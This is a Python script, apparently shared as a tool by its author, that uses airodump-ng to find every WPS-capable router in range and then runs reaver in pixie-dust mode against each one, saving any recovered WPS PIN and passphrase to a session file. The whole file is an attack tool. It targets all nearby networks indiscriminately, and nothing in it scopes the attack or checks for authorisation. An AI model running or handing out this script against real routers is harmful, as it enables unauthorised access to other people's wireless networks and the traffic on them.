#!/usr/bin/env python

'''
@author: rafcolm_

runs reaver+pixie-dust mode on all WPS-capable routers around you. 

Required Argument:
	-i, --interface=<wlan>          Name of the monitor-mode interface

Example:
	reaver-er -i mon0 

REQUIRES: 
-input interface to be already in MONITOR MODE (use airmon-ng for that)
-needs to be run as sudo
-airodump-ng (with WPS feature; version 1.2 & up)
-reaver
-pixie-dust
'''
import sys
import subprocess
import os
from subprocess import TimeoutExpired, PIPE, call, STDOUT, check_output
import time

global INTERFACE
global dumps_list
global wps_dumps
global SESSION_NAME

def main():
    if len(sys.argv) != 3:
        print("Script that runs reaver+pixie-dust mode on all WPS-capable routers around you and prints the result.\n\nRequired Argument:\n     <wlan>          Name of the monitor-mode interface \n     <session>          Name for the current session\n\n Example: \n    reaver-er mon0 session0\n\n REQUIRES: \n -input interface to be already in MONITOR MODE (use airmon-ng for that) \n -needs to be run as sudo \n -airodump-ng (with WPS feature; version 1.2 & up) \n -reaver \n -pixie-dust")
        sys.exit()
    dumps_list = []
    INTERFACE = sys.argv[1]
    SESSION_NAME = sys.argv[2]
    airodump = subprocess.Popen(["airodump-ng", INTERFACE, "--wps"])
    try:
        print ("\n[OUT]************ running AIRIDUMP-NG using ",  INTERFACE, "  ************ \n")
        a, b = airodump.communicate(timeout=3)
    except TimeoutExpired:
        os.system("sudo pkill airodump-ng")
        airodump.terminate()
        airodump.kill()
        print ("\n[OUT]************ AIRODUMP-NG done.  WPS routers available: ************ \n")
        o_airodump, unused_stderr = airodump.communicate()
        dumps_index = o_airodump.decode(encoding='UTF-8').rfind("CH ")
        o_airodump = o_airodump[dumps_index:]
        dumps_list = o_airodump.splitlines()
        dumps_list.pop(0)
        dumps_list.pop(0)
    wps_dumps = []
    output_file = open(SESSION_NAME + '_full.txt', 'w+')
    output_file.write('BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH WPS                    ESSID\n')
    print('BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH WPS                    ESSID\n')
    for i in dumps_list:
        current_AP = i.split()
        if b'1.0' in current_AP:
            output_file.write(i.decode(encoding='UTF-8') + "\n")
            print(i.decode(encoding='UTF-8') + "\n")
            wps_dumps.append(i)
    if len(wps_dumps) <= 0:
        print("\n\n[OUT]************ NO WPS ROUTER FOUND AROUND.  Terminating.\n\n")
        output_file.close()
        os.remove(output_file.name)
        sys.exit()
    for wps in wps_dumps:
        temp = wps.split()
        output_file.write("\n[OUT]********************* PIXIE-DUST on " + temp[0].decode(encoding='UTF-8') + "  *********************\n")
        print("\n[OUT]********************* PIXIE-DUST on " + temp[0].decode(encoding='UTF-8') + "  *********************\n")
        reaver_p = subprocess.Popen(["reaver", "-i" , INTERFACE, "-b", temp[0].decode(encoding='UTF-8'), "-v", "-c", temp[5].decode(encoding='UTF-8'), "-d", "12", "-N", "-K", "1", "-Z"], stdout=PIPE)
        try:
            reaver_o, unused_reaver = reaver_p.communicate(timeout=400)
            print("\n[OUT]************ SESSION SUCCESFUL. Output:*********************\n")
            os.system("sudo pkill reaver")
            output_file.write(reaver_o.decode(encoding='UTF-8'))
            print(reaver_o.decode(encoding='UTF-8'))
        except TimeoutExpired:
            os.system("sudo pkill reaver")
            print("\n[OUT]************ SESSION FAILED. *********************\n")
            pass
    output_file.close()
    os.system("sudo pkill reaver")
    print("\n\n[OUT]************  DONE.  *********************\n\n")
    

if __name__ == '__main__':
    main()

